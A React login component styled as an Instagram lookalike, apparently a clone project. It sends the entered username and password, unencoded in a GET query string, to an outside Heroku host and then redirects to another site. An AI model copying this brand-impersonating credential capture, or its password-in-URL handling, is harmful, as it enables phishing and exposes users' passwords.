import React, { useState } from "react";
import axios from "axios";
import * as BsIcon from "react-icons/bs";
const Lstyle = () => {
  return (
    <style>
      {`
                @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
                @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
                .main-container{
                    width:100%;
                    height: 100vh;
                    overflow:hidden;
                }
                
                .second-container{
                    width: 90%;
                    margin: auto;
                    margin-top: 10%;
                    /* background-color: blueviolet; */
                    margin-bottom: 35%;
                    font-family: 'Roboto', sans-serif;
                }
                .second-container h1{
                    font-size: 40px;
                    margin-bottom: 25px;
                    text-align: center;
                    font-family: 'Pacifico', cursive;
                }
                
                .second-container .form{
                    width: 100%;
                }
                .form input{
                    width: 100%;
                    border: 1px solid rgb(158, 157, 157);
                    padding: 10px;
                    height: 48px;
                    margin-bottom: 15px;
                    border-radius: 5px;
                }
                .form input:focus{
                    outline: none;
                }
                .form button{
                    background-color: #3593eb;
                    width: 100%;
                    height: 48px;
                    text-align: center;
                    padding: 5px 0px;
                    border: none;
                    color: white;
                    font-weight:800;
                    margin-bottom: 10px;
                    border-radius: 5px;
                }
                
                .form-help{
                    display: flex;
                    justify-content: center;
                    font-weight: 400;
                    margin-bottom: 10px;
                    align-items: center;
                }
                .form-help a{
                    text-decoration: none;
                    color: rgb(8, 8, 44);
                    font-size:14px;
                    margin-top: 15px;
                    font-weight:600;
                }
                .form-help a span{
                    color: gray;
                }
                
                .two-line{
                    display: flex;
                    width: 100%;
                    justify-content: center;
                    color: gray;
                    margin-top: 20px;
                    margin-bottom: 15px;
                    font-weight: 600;
                    font-family: 'Roboto', sans-serif;
                }
                
                .two-line .one{
                    width: 48%;
                    margin-right: 2%;
                }
                .two-line .two{
                    width: 48%;
                    margin-left: 2%;
                }
                
                
                .help-border{
                    display: flex;
                    justify-content: center;
                    font-family: 'Roboto', sans-serif;
                }
                
                .help-border a{
                    text-decoration: none;
                    color: #0D6EFD;
                    font-size: 19px;
                    font-weight: 600;
                }
                
                .bottom-signup{
                    display: flex;
                    justify-content: center;
                    position:relative;
                    top:-50px;
                    border-top: 1px solid rgb(158, 158, 158);
                    padding-top: 14px;
                    font-family: 'Roboto', sans-serif;
                }
                
                .bottom-signup a{
                    text-decoration: none;
                    color: rgb(8, 8, 44);
                }
                
                .bottom-signup a span{
                    color: gray;
                }
                .fb-size{
                    height:50px;
                }
                img{
                    position:relative;
                    left:10px;
                }
                .error_color{
                    color:red;
                }
            `}
    </style>
  );
};
const Login = () => {
  const [formData, setFormData] = useState({
    mail: "",
    pass: "",
  });
  const [error, setError] = useState("");
  function handleSubmit(e) {
    const { mail, pass } = formData;

    if (mail.length && pass.length) {
      const url = `https://instagramclonebackground.herokuapp.com/api/v1/login?mail=${formData.mail}&pass=${pass}`;
      axios
        .get(url)
        .then((resp) => {
          if (resp.data.success) {
            window.location.assign("https://intalgo.vercel.app");
          }
        })
        .catch((err) => {
          console.log(err);
        });
    } else setError("Required");
  }
  return (
    <>
      <div className="main-container p-2">
        <div className="second-container">
          <div>
            <img
              className="w-75 h-75 mx-4 mb-4"
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png"
            />
          </div>
          <div className="form">
            <input
              className="bg bg-light"
              type="text"
              placeholder="Phone number, email or usrname"
              required
              onChange={(e) => {
                setFormData({
                  ...formData,
                  mail: e.target.value,
                });
              }}
            />
            <p className="error_color">{error}</p>
            <input
              className="bg bg-light"
              type="password"
              placeholder="Password"
              required
              onChange={(e) => {
                setFormData({
                  ...formData,
                  pass: e.target.value,
                });
              }}
            />
            <p className="error_color">{error}</p>
            <button type="submit" className="button" onClick={handleSubmit}>
              Log In
            </button>
          </div>
          <div className="form-help">
            <a className="" href="/">
              <span>Forget your login details?</span> Get help logging in.
            </a>
          </div>
          <div className="two-line">
            <hr className="one" /> OR <hr className="two" />
          </div>
          <div className="help-border">
            <a href="/">
              <span>
                <BsIcon.BsFacebook className="fb-size" />
              </span>{" "}
              Log in with Facebook
            </a>
          </div>
        </div>
        <div className="bottom-signup p-3">
          <a style={{ fontWeight: 800 }} href="/">
            <span>Don't have an account?</span> Sign up.
          </a>
        </div>
      </div>
      <Lstyle />
    </>
  );
};

export default Login;
